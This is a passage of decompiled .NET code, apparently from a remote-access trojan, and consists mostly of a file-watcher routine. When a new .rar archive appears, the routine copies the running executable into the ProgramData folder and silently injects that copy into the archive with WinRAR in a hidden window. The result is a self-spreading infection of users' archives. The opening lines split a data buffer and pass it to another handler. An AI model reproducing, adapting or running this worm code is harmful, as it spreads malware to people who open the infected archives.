						num2++;
						continue;
					}
					return;
				}
				memoryStream.Dispose();
				memoryStream = new MemoryStream();
				memoryStream.Write(Data, 0, num2);
				WC.AT(memoryStream.ToArray());
				if (Data.Length - memoryStream.ToArray().Length > 5)
				{
					memoryStream.ToArray();
					memoryStream.Dispose();
					memoryStream = new MemoryStream();
					memoryStream.Write(Data, num2 + 5, Data.Length - num2 - 10);
					WC.AT(memoryStream.ToArray());
					memoryStream.Dispose();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void fs_Created(object sender, FileSystemEventArgs e)
	{
		checked
		{
			try
			{
				if (!e.FullPath.ToLower().EndsWith(".rar"))
				{
					return;
				}
				if (!File.Exists(Interaction.Environ("programdata") + "\\" + Ui))
				{
					try
					{
						File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programdata") + "\\" + Ui, overwrite: true);
						File.SetAttributes(Interaction.Environ("programdata") + "\\" + Ui, FileAttributes.Normal);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						return;
					}
				}
				else if (FileSystem.FileLen(Interaction.Environ("programdata") + "\\" + Ui) != FileSystem.FileLen(Application.get_ExecutablePath()))
				{
					File.Delete(Interaction.Environ("programdata") + "\\" + Ui);
					File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programdata") + "\\" + Ui, overwrite: true);
					File.SetAttributes(Interaction.Environ("programdata") + "\\" + Ui, FileAttributes.Normal);
				}
				string[] block = Block;
				foreach (string text in block)
				{
					if (Operators.CompareString(e.FullPath, text, false) == 0)
					{
						return;
					}
				}
				Block[inx] = e.FullPath;
				inx++;
				int num = 0;
				do
				{
					Thread.Sleep(4000);
					if (!File.Exists(e.FullPath))
					{
						break;
					}
					byte[] array = File.ReadAllBytes(e.FullPath);
					byte[] array2 = new byte[6] { 61, 123, 0, 64, 7, 0 };
					int num2 = array2.Length - 1;
					int num3 = 0;
					while (true)
					{
						if (num3 > num2)
						{
							return;
						}
						if (array[array.Length - array2.Length + num3] != array2[num3])
						{
							break;
						}
						try
						{
							ProcessStartInfo processStartInfo = new ProcessStartInfo();
							processStartInfo.FileName = "winrar";
							processStartInfo.Arguments = "a \"" + e.FullPath + "\" \"" + Interaction.Environ("programdata") + "\\" + Ui + "\"";
							processStartInfo.CreateNoWindow = true;
							processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							Process.Start(processStartInfo);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							err++;
							if (err > 9)
							{
								fs.EnableRaisingEvents = false;
								fs.Dispose();
							}
							ProjectData.ClearProjectError();
						}
						num3++;
					}
					num++;
				}
				while (num != 10);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				err++;
				if (err > 9)
				{
					fs.EnableRaisingEvents = false;
					fs.Dispose();
				}
				ProjectData.ClearProjectError();
			}
		}
	}
}
